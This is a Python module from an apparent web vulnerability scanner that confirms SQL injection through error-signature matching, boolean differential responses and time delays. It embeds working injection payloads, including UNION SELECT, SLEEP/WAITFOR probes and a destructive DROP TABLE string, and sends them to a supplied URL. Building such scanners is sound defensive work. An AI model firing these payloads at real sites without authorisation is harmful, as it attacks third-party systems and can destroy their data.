"""
Aegis AI — Multi-Stage SQL Injection Verifier

Three-stage verification to eliminate false positives:

  Stage 1 — Injection Test
      Send classic injection payloads and check for SQL error signatures.

  Stage 2 — Error Detection
      Search response body for concrete DBMS error patterns
      (MySQL, PostgreSQL, Oracle, MSSQL, SQLite).

  Stage 3 — Behaviour Change (Boolean Differential)
      Send TRUE condition  (' AND 1=1--)  → response A
      Send FALSE condition (' AND 1=2--)  → response B
      If A ≠ B → high probability SQL injection.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

import sys, pathlib
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent.parent))

from scanner.request_engine import RequestEngine, HttpResponse
from backend.analysis.response_fingerprint import ResponseFingerprint, FingerprintDiff
from utils.logger import get_logger

logger = get_logger(__name__, "VERIFY-SQLI")


# ── DBMS Error Signatures ───────────────────────────────────────────────────

DBMS_ERROR_PATTERNS: List[re.Pattern] = [
    # MySQL
    re.compile(r"SQL syntax.*?MySQL", re.I),
    re.compile(r"Warning.*?\bmysql_", re.I),
    re.compile(r"MySQLSyntaxErrorException", re.I),
    re.compile(r"valid MySQL result", re.I),
    re.compile(r"check the manual that corresponds to your (MySQL|MariaDB)", re.I),
    re.compile(r"You have an error in your SQL syntax", re.I),
    # PostgreSQL
    re.compile(r"PostgreSQL.*?ERROR", re.I),
    re.compile(r"ERROR:\s+syntax error at or near", re.I),
    re.compile(r"psycopg2\.\w+Error", re.I),
    re.compile(r"pg_query\(\).*?failed", re.I),
    # Oracle
    re.compile(r"ORA-\d{5}", re.I),
    re.compile(r"oracle\.jdbc", re.I),
    # MSSQL
    re.compile(r"Unclosed quotation mark", re.I),
    re.compile(r"Microsoft OLE DB Provider for SQL Server", re.I),
    re.compile(r"ODBC SQL Server Driver", re.I),
    re.compile(r"SqlException.*?Incorrect syntax", re.I),
    # SQLite
    re.compile(r"SQLite(?:Exception|\.)", re.I),
    re.compile(r"SQLITE_ERROR", re.I),
    # Generic
    re.compile(r"Syntax error in string in query expression", re.I),
    re.compile(r"Unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
]

# ── Injection payloads per stage ─────────────────────────────────────────────

STAGE1_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "1; DROP TABLE test--",
]

BOOLEAN_TRUE_PAYLOADS = [
    "' AND 1=1--",
    "' AND 'a'='a'--",
    "\" AND 1=1--",
    "1 AND 1=1",
]

BOOLEAN_FALSE_PAYLOADS = [
    "' AND 1=2--",
    "' AND 'a'='b'--",
    "\" AND 1=2--",
    "1 AND 1=2",
]

TIME_PAYLOADS = [
    "' OR SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "' OR pg_sleep(3)--",
]


@dataclass
class SQLiVerificationResult:
    """Result of multi-stage SQLi verification."""
    verified: bool = False
    stage_reached: int = 0          # 1, 2, or 3
    confidence: float = 0.0
    technique: str = ""             # error-based | boolean-blind | time-blind
    dbms_hint: str = ""             # MySQL | PostgreSQL | Oracle | ...
    evidence: str = ""
    request_evidence: str = ""
    response_evidence: str = ""
    baseline_fingerprint: Optional[Dict] = None
    payload_fingerprint: Optional[Dict] = None
    boolean_diff: Optional[Dict] = None


class SQLInjectionVerifier:
    """
    Three-stage SQL injection verifier.

    Only reports a vulnerability when concrete proof is obtained.
    """

    # ── public API ───────────────────────────────────────────────────────

    async def verify(
        self,
        url: str,
        parameter: str,
        engine: RequestEngine,
    ) -> SQLiVerificationResult:
        """
        Run all three verification stages against *url* + *parameter*.
        Returns the strongest evidence found.
        """
        result = SQLiVerificationResult()

        # Baseline fingerprint
        baseline_resp = await engine.get_baseline(url)
        if baseline_resp.error:
            return result
        baseline_fp = ResponseFingerprint.build(baseline_resp)
        result.baseline_fingerprint = baseline_fp

        # ── Stage 1: Injection Test ──────────────────────────────────────
        stage1 = await self._stage1_injection(url, parameter, engine, baseline_fp)
        if stage1:
            result.stage_reached = 1
            result.evidence = stage1["evidence"]
            result.request_evidence = stage1["request"]
            result.response_evidence = stage1["response"]
            result.payload_fingerprint = stage1["fingerprint"]

        # ── Stage 2: Error Detection ─────────────────────────────────────
        stage2 = await self._stage2_error_detection(url, parameter, engine)
        if stage2:
            result.stage_reached = 2
            result.verified = True
            result.confidence = 0.95
            result.technique = "error-based"
            result.dbms_hint = stage2["dbms"]
            result.evidence = stage2["evidence"]
            result.request_evidence = stage2["request"]
            result.response_evidence = stage2["response"]
            return result

        # ── Stage 3: Boolean Differential ────────────────────────────────
        stage3 = await self._stage3_boolean_diff(url, parameter, engine, baseline_fp)
        if stage3:
            result.stage_reached = 3
            result.verified = True
            result.confidence = 0.85
            result.technique = "boolean-blind"
            result.boolean_diff = stage3["diff"]
            result.evidence = stage3["evidence"]
            result.request_evidence = stage3["request"]
            result.response_evidence = stage3["response"]
            return result

        # ── Optional: time-based blind ───────────────────────────────────
        stage_time = await self._stage_time_blind(url, parameter, engine)
        if stage_time:
            result.stage_reached = 3
            result.verified = True
            result.confidence = 0.75
            result.technique = "time-blind"
            result.evidence = stage_time["evidence"]
            result.request_evidence = stage_time["request"]
            result.response_evidence = stage_time["response"]
            return result

        # Nothing confirmed — carry forward best stage-1 suspicion
        if stage1:
            result.confidence = 0.3
        return result

    # ── Stage implementations ────────────────────────────────────────────

    async def _stage1_injection(
        self, url, param, engine, baseline_fp,
    ) -> Optional[Dict]:
        """Stage 1: send injection payloads and compare fingerprints."""
        from urllib.parse import urlparse, parse_qs, urlencode

        for payload in STAGE1_PAYLOADS:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            qs[param] = [payload]
            test_url = parsed._replace(query=urlencode({k: v[0] for k, v in qs.items()})).geturl()

            resp = await engine.get(test_url)
            if resp.error:
                continue

            fp = ResponseFingerprint.build(resp)
            diff = ResponseFingerprint.compare(baseline_fp, fp)

            if diff["significant"]:
                req_str = f"GET {test_url} HTTP/1.1"
                resp_str = self._format_response(resp)
                return {
                    "evidence": (
                        f"Stage 1 — fingerprint changed with injection payload: {payload}\n"
                        f"Status: {baseline_fp['status']}→{fp['status']} | "
                        f"Length: {baseline_fp['length']}→{fp['length']} | "
                        f"Hash: {baseline_fp['hash'][:8]}→{fp['hash'][:8]}"
                    ),
                    "fingerprint": fp,
                    "request": req_str,
                    "response": resp_str,
                }
        return None

    async def _stage2_error_detection(
        self, url, param, engine,
    ) -> Optional[Dict]:
        """Stage 2: search for DBMS error patterns in responses."""
        from urllib.parse import urlparse, parse_qs, urlencode

        error_payloads = ["'", "\"", "\\", "' OR ''='", "1'1"]
        for payload in error_payloads:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            qs[param] = [payload]
            test_url = parsed._replace(query=urlencode({k: v[0] for k, v in qs.items()})).geturl()

            resp = await engine.get(test_url)
            if resp.error:
                continue

            for pattern in DBMS_ERROR_PATTERNS:
                match = pattern.search(resp.body)
                if match:
                    dbms = self._identify_dbms(pattern.pattern)
                    return {
                        "evidence": (
                            f"Stage 2 — DBMS error detected: {match.group()}\n"
                            f"Database: {dbms}"
                        ),
                        "dbms": dbms,
                        "request": f"GET {test_url} HTTP/1.1",
                        "response": self._format_response(resp),
                    }
        return None

    async def _stage3_boolean_diff(
        self, url, param, engine, baseline_fp,
    ) -> Optional[Dict]:
        """Stage 3: boolean differential — compare TRUE vs FALSE conditions."""
        from urllib.parse import urlparse, parse_qs, urlencode

        for true_pl, false_pl in zip(BOOLEAN_TRUE_PAYLOADS, BOOLEAN_FALSE_PAYLOADS):
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)

            # TRUE condition
            qs[param] = [true_pl]
            true_url = parsed._replace(query=urlencode({k: v[0] for k, v in qs.items()})).geturl()
            resp_true = await engine.get(true_url)

            # FALSE condition
            qs[param] = [false_pl]
            false_url = parsed._replace(query=urlencode({k: v[0] for k, v in qs.items()})).geturl()
            resp_false = await engine.get(false_url)

            if resp_true.error or resp_false.error:
                continue

            fp_true = ResponseFingerprint.build(resp_true)
            fp_false = ResponseFingerprint.build(resp_false)
            diff = ResponseFingerprint.compare(fp_true, fp_false)

            if diff["significant"]:
                return {
                    "evidence": (
                        f"Stage 3 — Boolean differential confirmed\n"
                        f"TRUE  ({true_pl}): length={fp_true['length']}, hash={fp_true['hash'][:8]}\n"
                        f"FALSE ({false_pl}): length={fp_false['length']}, hash={fp_false['hash'][:8]}\n"
                        f"Δlength={diff['length_delta']}, hash_match={diff['hash_match']}"
                    ),
                    "diff": diff,
                    "request": f"TRUE: GET {true_url}\nFALSE: GET {false_url}",
                    "response": (
                        f"TRUE response ({fp_true['length']}B):\n"
                        f"{resp_true.body[:200]}\n---\n"
                        f"FALSE response ({fp_false['length']}B):\n"
                        f"{resp_false.body[:200]}"
                    ),
                }
        return None

    async def _stage_time_blind(
        self, url, param, engine,
    ) -> Optional[Dict]:
        """Bonus: time-based blind check — SLEEP / WAITFOR / pg_sleep."""
        from urllib.parse import urlparse, parse_qs, urlencode

        # Get baseline timing (average of 2 requests)
        r1 = await engine.get(url)
        r2 = await engine.get(url)
        baseline_time = (r1.response_time_ms + r2.response_time_ms) / 2

        for payload in TIME_PAYLOADS:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            qs[param] = [payload]
            test_url = parsed._replace(query=urlencode({k: v[0] for k, v in qs.items()})).geturl()

            resp = await engine.get(test_url)
            if resp.error:
                continue

            delta = resp.response_time_ms - baseline_time
            if delta > 2500:  # > 2.5s delay indicates sleep worked
                return {
                    "evidence": (
                        f"Time-based blind SQLi confirmed\n"
                        f"Baseline: {baseline_time:.0f}ms → Payload: {resp.response_time_ms:.0f}ms "
                        f"(Δ{delta:.0f}ms)"
                    ),
                    "request": f"GET {test_url} HTTP/1.1",
                    "response": self._format_response(resp),
                }
        return None

    # ── Helpers ──────────────────────────────────────────────────────────

    @staticmethod
    def _identify_dbms(pattern_str: str) -> str:
        p = pattern_str.lower()
        if "mysql" in p or "mariadb" in p:
            return "MySQL"
        if "postgre" in p or "pg_" in p:
            return "PostgreSQL"
        if "ora-" in p or "oracle" in p:
            return "Oracle"
        if "mssql" in p or "sql server" in p or "waitfor" in p:
            return "MSSQL"
        if "sqlite" in p:
            return "SQLite"
        return "Unknown"

    @staticmethod
    def _format_response(resp: HttpResponse, max_body: int = 300) -> str:
        lines = [f"HTTP/1.1 {resp.status_code}"]
        for k, v in list(resp.headers.items())[:10]:
            lines.append(f"{k}: {v}")
        lines.append("")
        lines.append(resp.body[:max_body])
        return "\n".join(lines)
